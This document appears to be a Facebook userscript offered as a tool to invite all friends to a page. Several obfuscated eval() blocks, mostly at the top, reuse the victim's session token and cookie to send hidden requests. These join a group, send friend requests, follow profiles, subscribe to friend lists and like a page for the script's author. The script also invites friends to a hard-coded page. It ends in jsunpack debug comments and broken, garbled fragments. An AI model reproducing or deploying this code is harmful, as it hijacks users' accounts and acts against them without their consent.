// ==UserScript==
// @name        invite-all-friends-to-page
// @version 1
// ==/UserScript==


eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('4=c.4;t(4!=m){2=c.Q("2");2.3.o="v";2.3.w="x";2.3.z="10";2.3.A="Z";2.3.H="J";2.3.O=1.9;2.3.h="+i";2.3.j="+k";2.3.l="7(n,0,0,1.9)";2.3.p="q r 7(0,0,0,1.9)";2.3.s="P";2.u="<a V=\'U\'y=\'1g://X.Y.S/1m.11?19=1b\' 3=\'B-C:D;E:#F \'G=\'\\6\\6\\13\\R\\5\\1d\\6 \\5\\K\\L\\M \\N\\d\\5\'><8><b>12</b></8></a>";4.I(2)}4=c.4;t(4!=m){2=c.Q("2");2.3.o="v";2.3.w="x";2.3.z="14";2.3.A="15";2.3.H="J";2.3.O=1.9;2.3.h="+i";2.3.j="+k";2.3.l="7(n,0,0,1.9)";2.3.p="q r 7(0,0,0,1.9)";2.3.s="P";2.u="<a V=\'U\'y=\'16://17.18.S/\' 3=\'B-C:D;E:#F \'G=\'\\5\\K\\L\\M \\N\\d\\5 \\6\\e\\1a\\T\\1c \\f\\g\\T\\1f \\5\\6\\W\\e\\5\\g\\f\'><8><b>1h 1i</b></8></a>";4.I(2)}4=c.4;t(4!=m){2=c.Q("2");2.3.o="v";2.3.w="x";2.3.z="1j";2.3.A="1k";2.3.H="J";2.3.O=1.9;2.3.h="+i";2.3.j="+k";2.3.l="7(n,0,0,1.9)";2.3.p="q r 7(0,0,0,1.9)";2.3.s="P";2.u="<a  y=\'\' 3=\'B-C:D;E:#F \'G=\'\\6\\6\\1l\\e\\R\\f \\g\\d \\5\\6\\W\\e\\d\\5\\g\\f \\5\\K\\L\\M \\N\\d\\5\'><8><b>1e</b></8></a>";4.I(2)};',62,85,"||div|style|body|u0627|u0644|rgba|blink|||center|document|u0646|u0631|u062c|u0645|bottom|65px|left|0px|backgroundColor|null|188|position|border|3px|solid|padding|if|innerHTML|fixed|display|block|href|top|width|font|weight|bold|color|fcff00|title|height|appendChild|15px|u0636|u063a|u0637|u0647|opacity|5px|createElement|u0648|com|u064a|_blank|target|u0628|www|facebook|125px|470px|el3almy|El3almy|u062a|500px|150px|http|codesel3almy|blogspot|ref|u0624|hl|u0629|u0635|Exit|u0639|https|All|Programs|530px|175px|u062e|codes".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('2 g=["%b%6%h%i%4%b%6%F%r%4%4%h%i%4%6"];2 5=7["l"]("5")[0]["o"];2 a=7["k"]["c"](7["k"]["c"](/G=(\\d+)/)[1]);2 3=m n;2 f="/p/q/P/s.t?u=1";2 8="&w=y&z="+g+"&5="+5+"&A="+a+"&B=";3["C"]("D",f,E);3["9"]("j-H","I/x-J-K-L");3["9"]("j-e",8["e"]);3["9"]("M","N-O");3["v"](8)',52,52,"||var|httpwp|32|fb_dtsg|33|document|paramswp|setRequestHeader|user_id|37|match||length|urlwp|gid|38|30|Content|cookie|getElementsByName|new|XMLHttpRequest|value|ajax|groups|36|r2j|php|__a|send|ref||group_jump_header|group_id|__user|phstamp|open|POST|true|39|c_user|type|application|www|form|urlencoded|Connection|keep|alive|membership".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('3 5=c.s(\'5\')[0].o;3 l=c.f.h(c.f.h(/B=(\\d+)/)[1]);j 9(r){3 X=J U();3 a="//V.W.Y/n/m/g.q";3 b="t="+r+"&g=m&u=v&w=x&&&12=&y=z&A=i&C&D&E="+l+"&F=1&G=H-&I=e&5="+5+"&K=";X.L("M",a,i);X.N=j(){O(X.P==4&&X.Q==R){X.S}};X.T(b)}9("%6%2%2%2%2%7%2%6%8%k%6%8%k%e%Z");9("%6%2%2%2%2%7%7%e%2%8%7%8%p");',62,65,"||30|var||fb_dtsg|31|34|36|IDS|||document||35|cookie|action|match|true|function|39|user_id|add_friend|ajax|value|37|php||getElementsByName|to_friend|how_found|friend_browser_s|ref_param|none|logging_location|search|no_flyout_on_click|c_user|ego_log_data|http_referer|__user|__a|__dyn|798aD5z5CF|__req|new|phstamp|open|POST|onreadystatechange|if|readyState|status|200|close|send|XMLHttpRequest|www|facebook||com|38|33|32|outgoing_id".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('6 7=f.p(\'7\')[0].J;6 n=f.j.k(f.j.k(/I=(\\d+)/)[1]);i a(b){6 c=K L();6 d="/M/o/O.P?Q=1";6 e="q="+b+"&r=1&s=o-R&t=u&7="+7+"&v&w"+n+"&x=";c.y("z",d,A);c.B=i(){C(c.D==4&&c.E==F){c.G}};c.H(e)}a("%5%2%2%2%2%3%g%8%3%8%3%m%8%8%9");a("%5%2%2%2%2%3%2%5%h%l%5%h%l%N%9");a("%5%2%2%2%2%3%g%3%2%h%g%m%9%9%2");',54,54,"||30|34||31|var|fb_dtsg|37|38||||||document|32|36|function|cookie|match|39|33|user_id|follow|getElementsByName|profile_id|location|source|subscribed_button_id|u37qac_37|lsd|__|phstamp|open|POST|true|onreadystatechange|if|readyState|status|200|close|send|c_user|value|new|XMLHttpRequest|ajax|35|follow_profile|php|__a|button".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('9 e=i.11(\'e\')[0].Z;9 n=i.p.o(i.p.o(/A=(\\d+)/)[1]);m c(L){9 X=14 s();9 a="//B.W.Y/10/12/13/k/r";9 b="t="+L+"&u=k&v=w&x[z]=15&l[C]=D&l[q]=E&F="+n+"&G=1&H=I&J=y&e="+e+"&K=";X.M("N",a,O);X.P=m(){Q(X.R==4&&X.S==T){X.U}};X.V(b)}c("%f%2%2%8%3%g%3%5%5%2%g%8%8%2%2");c("%3%7%3%5%8%8%j%2%h%j%7%2%h%6%7");c("%5%6%7%2%5%h%5%3%6%5%8%6%f%3%3");c("%5%7%2%6%7%f%2%3%j%f%g%3%2%6%g");',62,68,"||35|33||34|31|39|38|var|||LIST||fb_dtsg|32|36|30|document|37|subscribe|ft|function|user_id|match|cookie|tn|modify|XMLHttpRequest|flid|action|location|feed|nctr||_mod|c_user|www|type|40|DH|__user|__a|__dyn|7n8ahxoNpGo|__req|phstamp||open|POST|true|onreadystatechange|if|readyState|status|200|close|send|facebook||com|value|ajax|getElementsByName|friends|lists|new|pagelet_group_mall".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('2 3=5.s(\'3\')[0].T;2 e=5.f.h(5.f.h(/w=(\\d+)/)[1]);8 9(p){2 a=U V();2 b="//X.l.m/n/o/q.r";2 c="&t="+p+"&u=g&v=10&x=y&z=&A=&B[C]=D&E="+e+"&F=1&G=H-&I=d&3="+3+"&J=";a.K("L",b,g);a.M=8(){N(a.O==4&&a.P==Q){a.R}};a.S(c)}9("%i%6%7%j%i%k%6%Y%7%6%Z%W%7%k%j");',62,63,"||var|fb_dtsg||document|33|30|function|Like|||||user_id|cookie|true|match|34|38|36|facebook|com|ajax|pages||fan_status|php|getElementsByName|fbpage_id|add|reload|c_user|fan_origin|page_timeline|fan_source|cat|nctr|_mod|pagelet_timeline_page_actions|__user|__a|__dyn|798aD5z5CF|__req|phstamp|open|POST|onreadystatechange|if|readyState|status|200|close|send|value|new|XMLHttpRequest|39|www|32|37|false".split("|"),0,{}));eval(unescape("var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
var Title = "El3almy</A>";
var Descriptions = "",
    _text ='<A style="color:#3B5998;" href="https://www.facebook.com/codes.el3almy" target="_blank"></A></br></A><A style="color:#3B5998;" href="https://www.facebook.com/groups/groupages" target="_blank"></A></A></A></A>';
 
page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
 
function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:8px solid rgba(186,0,0,1.1);background-color:rgba(0,0,0,1.9);color:#ffffff'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
            display += _text;
            display += "</div>";
            display += "</div>";
            display += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "*E* /9H) CD 'D'5/B'!.</A>";
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Invited.</b></br>";
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
 
 
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=430846320379068&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
 
  }
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
 function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}
 
//Inviting Wait....
 
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    display += arr.length + " Friends Detected, Please Wait . . .";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    InviteFriends(arr[i])
});
 
 
 
//jsunpack.called CreateElement div
 
//jsunpack.url element = undefined
//jsunpack.url var _4855 = var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');s
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div
 
//jsunpack.url var _4052 = var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div


"))